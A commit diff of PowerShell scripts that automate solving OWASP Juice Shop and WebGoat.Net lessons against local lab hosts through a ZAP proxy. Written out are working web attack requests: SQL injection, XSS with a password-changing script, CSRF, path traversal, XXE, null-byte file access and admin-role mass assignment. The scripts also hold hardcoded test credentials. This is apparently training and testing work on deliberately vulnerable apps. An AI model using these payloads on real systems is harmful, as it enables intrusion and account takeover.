dea0a766cbe59561d3d7c77e53f01559b6c6427d
M0l1neta <emilio-jose.roldan-navarro@sogeti.com>
2021-07-06 10:30:19 +0200

    update plan pruebas WebGoat.Net

--- Scripts/Plan Pruebas/PlanPruebas_OWASP_JuiceShop.ps1
+++ Scripts/Plan Pruebas/PlanPruebas_OWASP_JuiceShop.ps1
@@ -11,8 +11,8 @@ function waitIEReady($ie,$milis){
 #endregion
 
 
-$urlbase = "http://192.168.43.157:3000"
-$zap_proxy = "http://172.28.173.128:8082" 
+$urlbase = "http://192.168.2.130:3000"
+$zap_proxy = "http://172.25.194.216:8082" 
 
 $user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
 
@@ -27,10 +27,10 @@ $oIE.Visible=$true
 #---------------------------------------------------------------------------------------------------------------------------
 Clear-Host
 
-$response = Invoke-RestMethod "$urlbase/rest/admin/application-version"
+$response = Invoke-RestMethod "$urlbase/rest/admin/application-version" -Proxy $zap_proxy 
 Write-Host ("version: {0}" -f $response.version)
 
-$response = Invoke-RestMethod "$urlbase/rest/admin/application-configuration"  #-Proxy $zap_proxy 
+$response = Invoke-RestMethod "$urlbase/rest/admin/application-configuration"  -Proxy $zap_proxy 
 $scoreBoard = $response.config.application.securityTxt.acknowledgements
 
 $url = "{0}{1}" -f $urlbase,$scoreBoard
@@ -65,7 +65,7 @@ if($response.StatusCode -eq 200){write-host "Lección SQLi attack superada!!!"}
 $url = "$urlbase/rest/basket/1" 
 $session.Headers.Add('Authorization',"Bearer $token")
 
-$response = Invoke-RestMethod $url -WebSession $session
+$response = Invoke-RestMethod $url -WebSession $session -Proxy $zap_proxy 
 Write-Host ("Acceso carrito id: {0}" -f $response.data.id)
 if($response.data.id -eq 1){write-host "Lección Broken Acess Control superada!!!"}
 
@@ -74,7 +74,7 @@ if($response.data.id -eq 1){write-host "Lección Broken Acess Control superada!!
 #---------------------------------------------------------------------------------------------------------------------------
 $body = '{"email":"EmilioJRoldan4@gmail.com","password":"pass1234","passwordRepeat":"pass1234","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2021-06-28T15:44:12.390Z","updatedAt":"2021-06-28T15:44:12.390Z"},"securityAnswer":"antonio","role": "admin"}'
 $url = "$urlbase/api/Users/"
-$response = Invoke-RestMethod $url -WebSession $session -Method Post -Body $body
+$response = Invoke-RestMethod $url -WebSession $session -Method Post -Body $body -Proxy $zap_proxy 
 
 if($response.status -eq "success"){write-host "Lección Broken Authentication superada!!!"}
 
@@ -94,43 +94,54 @@ $res.ParsedHtml.body.getElementsByTagName('code').item(0).innerText
 #---------------------------------------------------------------------------------------------------------------------------
 
 $url = "$urlbase/robots.txt"
-$response = wget $url
+$response = wget $url -Proxy $zap_proxy 
 $response.Content
 
 $url = "$urlbase/ftp"
-$response = wget $url
+$response = wget $url -Proxy $zap_proxy 
 $response.Content
 $response.ParsedHtml.links | ft -Property href 
 
 #Exposed Metrics
-$url = "$urlbase/metrics"
-$response = wget $url 
+$url = "$urlbase/metrics" 
+$response = wget $url -Proxy $zap_proxy 
 $response.Content | select -First 3
 
 
 $url = "$urlbase/ftp/acquisitions.md"
-$response = wget $url
+$response = wget $url -Proxy $zap_proxy 
 if([bool]$resultado.lessonCompleted){write-host "Lección Broken Sensitive Data Exposure superada!!!"}
 
 
 $url = "$urlbase/ftp/package.json.bak%2500.md"
-wget $url -OutFile package.json.bak
+wget $url -OutFile package.json.bak -Proxy $zap_proxy 
+write-host "Lección Sensitive Data Exposure superada!!!"
 
 
 #---------------------------------------------------------------------------------------------------------------------------
-# CSRF
+# XSS & Cross-Site Request Forgery (CSRF) attack
 #---------------------------------------------------------------------------------------------------------------------------
-$url = "$urlbase/profile"
+$url = "$PSScriptRoot\Resources\CSRF_FORM.html"
 
-$response
+$url = "$urlbase/rest/user/login"
+$body = '{"email":"EmilioJRoldan@gmail.com","password":"Sogeti1234"}'
+$response = Invoke-RestMethod  "$urlbase/rest/user/login" -SessionVariable session -Method Post -Body $body -ContentType "application/json" -UserAgent $user_agent  -Proxy $zap_proxy 
+$token= $response.authentication.token
+
+$session.Headers.Add('Authorization',"Bearer $token")
+
+$url = "$urlbase/#/search?q=%3Cscript%3Exmlhttp%20%3D%20new%20XMLHttpRequest;%20xmlhttp.open('GET',%20'{0}%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic');%20xmlhttp.send()%3C%2Fscript%3E" -f [System.Web.HttpUtility]::UrlEncode($urlbase)
+$response = wget $url -Proxy $zap_proxy -WebSession $session
+
+$response = Invoke-RestMethod  "$urlbase/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic" -WebSession $session -ContentType "application/json" -UserAgent $user_agent  -Proxy $zap_proxy
+$response.user.email 
+if($response.user.email -ne [String]::Empty){write-host "Lección Cross-Site Request Forgery (CSRF) attacksuperada!!!"}
+$response = Invoke-RestMethod  "$urlbase/rest/user/change-password?new=Sogeti1234&repeat=Sogeti1234" -WebSession $session -ContentType "application/json" -UserAgent $user_agent  -Proxy $zap_proxy
+
+
 
 #---------------------------------------------------------------------------------------------------------------------------
 # Xml External Entities (XXE)
-#---------------------------------------------------------------------------------------------------------------------------
-
-
-#---------------------------------------------------------------------------------------------------------------------------
-# Cross-Site Request Forgery (CSRF) attack
 #---------------------------------------------------------------------------------------------------------------------------
 
 
---
+++ Scripts/Plan Pruebas/PlanPruebas_OWASP_WebGoat.Net.ps1
@@ -0,0 +1,151 @@
+﻿
+$urlbase = "http://192.168.42.39:8080"
+$zap_proxy = "http://172.25.194.216:8082" 
+
+#---------------------------------------------------------------------------------------------------------------------------
+# Create User
+#---------------------------------------------------------------------------------------------------------------------------
+Clear-Host
+$createuser = $true
+
+if($createuser){
+    $body = "username=eroldann&password=password&matchingPassword=password&agree=agree"
+    $response = wget "$urlbase/WebGoat/register.mvc" -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -Proxy $zap_proxy 
+}
+
+#---------------------------------------------------------------------------------------------------------------------------
+# Login
+#---------------------------------------------------------------------------------------------------------------------------
+$body = "username=eroldann&password=password"
+$session = $null
+$response = wget "$urlbase/WebGoat/login" -SessionVariable session -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -UserAgent $user_agent  -Proxy $zap_proxy 
+$response.ParsedHtml.queryselector('.dropdown-menu').children.item(2).innerText
+
+$user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
+
+#---------------------------------------------------------------------------------------------------------------------------
+# SQLi attack
+#---------------------------------------------------------------------------------------------------------------------------
+
+$response = wget "$urlbase/WebGoat/SqlInjection.lesson.lesson" -WebSession $session -UserAgent $user_agent -Proxy $zap_proxy 
+if(!($response.ParsedHtml.getElementById('_what_is_sql').innerText -eq 'What is SQL?')){
+    Write-Host "Error Acceso leccion 1"
+    break
+}
+
+#A1 Injection
+
+$session.Headers.Add('X-Requested-With','XMLHttpRequest')
+$session.Headers.Add("Content-Type","application/x-www-form-urlencoded; charset=UTF-8")
+
+
+$body = "query=select+*+from+employees+where+userid+%3D+96134"
+$response = $null
+$response = wget "$urlbase/WebGoat/SqlInjection/attack2" -Method Post -Body $body -WebSession $session -Proxy $zap_proxy 
+$resultado = ConvertFrom-Json $response.Content
+if([bool]$resultado.lessonCompleted){write-host "Lección SQLi 1  superada!!!"}
+
+
+$body = "query=UPDATE+employees+set++department++%3D+'Sales'+WHERE+userid+%3D+89762%3B"
+$response = wget "$urlbase/WebGoat/SqlInjection/attack3" -Method Post -Body $body -WebSession $session -Proxy $zap_proxy 
+$resultado = ConvertFrom-Json $response.Content
+if([bool]$resultado.lessonCompleted){write-host "Lección SQLi 2  superada!!!"}
+
+#Path 
+
+$fileBin = [System.IO.File]::ReadAllBytes("$PSScriptRoot\Resources\Logo_NN4ED.png")
+$enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
+$fileEnc = $enc.GetString($fileBin)
+$boundary = [System.Guid]::NewGuid().ToString()
+$LF = "`r`n"
+$bodyLines = (
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"uploadedFile`"; filename=`"Logo_NN4ED.png`"",
+    "Content-Type: image/png$LF",
+    $fileEnc,
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"fullName`"$LF",
+    "../test",
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"email`"$LF",
+    "pepe@pepe.com",
+    "--$boundary",
+    "Content-Disposition: form-data; name=`"password`"$LF",
+    "1234",
+    "--$boundary--$LF"
+    
+) -join $LF
+
+$response  = wget -Uri "$urlbase/WebGoat/PathTraversal/profile-upload" -Method Post -WebSession $session -ContentType "multipart/form-data; boundary=""$boundary""" -Body $bodyLines -Proxy $zap_proxy 
+$resultado = ConvertFrom-Json $response.Content
+if([bool]$resultado.lessonCompleted){write-host "Lección Path Traversal  superada!!!"}
+
+
+#---------------------------------------------------------------------------------------------------------------------------
+# Broken Authentication
+#---------------------------------------------------------------------------------------------------------------------------
+$body = "secQuestion7=pepe&secQuestion8=pepe&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746"
+$response  = wget -Uri "$urlbase/WebGoat/auth-bypass/verify-account" -Method Post -WebSession $session -ContentType "application/x-www-form-urlencoded" -Body $body -Proxy $zap_proxy 
+$resultado = ConvertFrom-Json $response.Content
+if([bool]$resultado.lessonCompleted){write-host "Lección Broken Authentication superada!!!"}
+
+
+#---------------------------------------------------------------------------------------------------------------------------
+# Sensitive Data Exposure
+#---------------------------------------------------------------------------------------------------------------------------
+$body = "{`"username`":`"CaptainJack`",`"password`":`"BlackPearl`"}"
+try{
+    $response  = wget -Uri "$urlbase/WebGoat/start.mvc" -Method Post -WebSession $session -Body $body -Proxy $zap_proxy
+}catch [System.Net.WebException]
+{
+    write-host "OK: $_.Exception.Message"
+}
+$body= "username=CaptainJack&password=BlackPearl"
+$response  = wget -Uri "$urlbase/WebGoat/InsecureLogin/task" -Method Post -WebSession $session -ContentType "application/x-www-form-urlencoded" -Body $body -Proxy $zap_proxy 
+
+$resultado = ConvertFrom-Json $response.Content
+if([bool]$resultado.lessonCompleted){write-host "Lección Broken Sensitive Data Exposure superada!!!"}
+
+#---------------------------------------------------------------------------------------------------------------------------
+# Xml External Entities (XXE)
+#---------------------------------------------------------------------------------------------------------------------------
+$response  = Invoke-RestMethod -Uri "$urlbase/WebGoat/XXE.lesson.lesson" -WebSession $session -Proxy $zap_proxy 
+
+$body = Get-Content "$PSScriptRoot\Resources\XXE_1.xml"
+$response  = Invoke-RestMethod  -Uri "$urlbase/WebGoat/xxe/simple" -Method Post -WebSession $session -ContentType "application/xml" -Body $body -Proxy $zap_proxy 
+
+if([bool]$response.lessonCompleted){write-host "Lección Xml External Entities (XXE) superada!!!"}
+
+
+#---------------------------------------------------------------------------------------------------------------------------
+# Cross-Site Request Forgery (CSRF) attack
+#---------------------------------------------------------------------------------------------------------------------------
+
+
+$response = wget "$urlbase/WebGoat/CSRF.lesson.lesson" -WebSession $session -Proxy $zap_proxy 
+$response = wget "$urlbase/WebGoat/service/lessoninfo.mvc" -WebSession $session -Proxy $zap_proxy 
+$response = wget "$urlbase/WebGoat/csrf/review" -WebSession $session -Proxy $zap_proxy 
+ 
+
+$body = "csrf=true&submit=Submit+Query"
+$response  = Invoke-RestMethod  -Uri "$urlbase/WebGoat/csrf/basic-get-flag" -Method Post -WebSession $session -ContentType "application/x-www-form-urlencoded" -Body $body -Proxy $zap_proxy 
+
+
+$response.flag
+$body = "confirmFlagVal={0}" -f $response.flag
+$response = Invoke-RestMethod  -Uri "$urlbase/WebGoat/csrf/confirm-flag-1" -Method Post -WebSession $session -Body $body -Proxy $zap_proxy 
+
+if([bool]$response.lessonCompleted){write-host "Lección Cross-Site Request Forgery (CSRF) superada!!!"}
+
+
+#---------------------------------------------------------------------------------------------------------------------------
+# Cross-Site Scripting (XSS) attack
+#---------------------------------------------------------------------------------------------------------------------------
+
+
+$response = wget "$urlbase/WebGoat/CrossSiteScripting.lesson.lesson" -WebSession $session -Proxy $zap_proxy 
+
+
+$response = Invoke-RestMethod "$urlbase/WebGoat/CrossSiteScripting/attack5a?QTY1=1&QTY2=1&QTY3=1&QTY4=1&field1=4128%203214%200002%201999&field2=alert(document.cookie)" -WebSession $session -Proxy $zap_proxy 
+
+if([bool]$response.lessonCompleted){write-host "Lección Cross-Site Scripting (XSS) superada!!!"}
